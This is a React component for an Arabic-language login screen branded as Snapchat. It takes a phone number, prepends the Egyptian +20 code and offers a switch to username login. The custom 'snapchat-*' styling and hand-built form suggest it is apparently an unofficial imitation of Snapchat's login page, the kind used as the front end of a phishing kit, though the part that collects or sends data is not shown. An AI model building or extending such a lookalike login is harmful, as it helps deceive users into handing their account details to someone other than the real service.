import { useState } from 'react';

interface LoginPhoneProps {
  onNext: (phone: string) => void;
  onSwitchToUsername: () => void;
}

const inputStyle: React.CSSProperties = {
  width: '100%',
  padding: '0.75rem 1rem',
  border: '2px solid #e5e7eb',
  borderRadius: '0.5rem',
  fontSize: '1rem',
  transition: 'border-color 0.2s',
};

export default function LoginPhone({ onNext, onSwitchToUsername }: LoginPhoneProps) {
  const [phone, setPhone] = useState('');
  const [countryCode, setCountryCode] = useState('EG');
  const [inputBorder, setInputBorder] = useState('#e5e7eb');
  const [phoneError, setPhoneError] = useState('');

  const handleNext = () => {
    // Validate phone number - must be exactly 11 digits
    if (phone.trim() && phone.length !== 11) {
      setPhoneError('قم بكتابة رقم الهاتف بشكل صحيح');
      return;
    }
    
    if (phone.trim()) {
      setPhoneError('');
      onNext(`+20${phone}`);
    }
  };

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, '');
    setPhone(value);
    // Clear error when user is typing
    if (phoneError) {
      setPhoneError('');
    }
  };

  const handleKeyPress = (e: React.KeyboardEvent) => {
    if (e.key === 'Enter') {
      handleNext();
    }
  };

  return (
    <div className="snapchat-container">
      <div className="snapchat-card">
        <h1 className="snapchat-title">تسجيل الدخول إلى سناب شات</h1>
        
        <div className="mb-6">
          <label className="snapchat-subtitle">رقم الهاتف</label>
          <div className="phone-input-wrapper">
            <select
              value={countryCode}
              onChange={(e) => setCountryCode(e.target.value)}
              className="country-code-select"
            >
              <option value="EG">🇪🇬 EG +20</option>
              <option value="SA">🇸🇦 SA +966</option>
              <option value="AE">🇦🇪 AE +971</option>
              <option value="KW">🇰🇼 KW +965</option>
              <option value="US">🇺🇸 US +1</option>
            </select>
            <input
              type="tel"
              style={{ ...inputStyle, borderColor: inputBorder }}
              value={phone}
              onChange={handlePhoneChange}
              onKeyPress={handleKeyPress}
              onFocus={() => setInputBorder('#3b82f6')}
              onBlur={() => setInputBorder('#e5e7eb')}
              placeholder=""
            />
          </div>
          {phoneError && (
            <div style={{ color: '#dc2626', fontSize: '0.875rem', marginTop: '0.5rem', textAlign: 'right' }}>
              {phoneError}
            </div>
          )}
        </div>

        <div className="text-center mb-6">
          <button
            onClick={onSwitchToUsername}
            className="snapchat-link"
          >
            استخدم اسم المستخدم أو عنوان البريد الإلكتروني بدلاً من ذلك
          </button>
        </div>

        <button
          onClick={handleNext}
          className="snapchat-button w-full"
          disabled={!phone.trim()}
        >
          التالي
        </button>

        <div className="snapchat-footer-link">
          هل أنت جديد في سناب شات؟{' '}
          <a href="https://www.snapchat.com/signup" target="_blank" rel="noopener noreferrer">
            تسجيل الاشتراك
          </a>
        </div>
      </div>
    </div>
  );
}
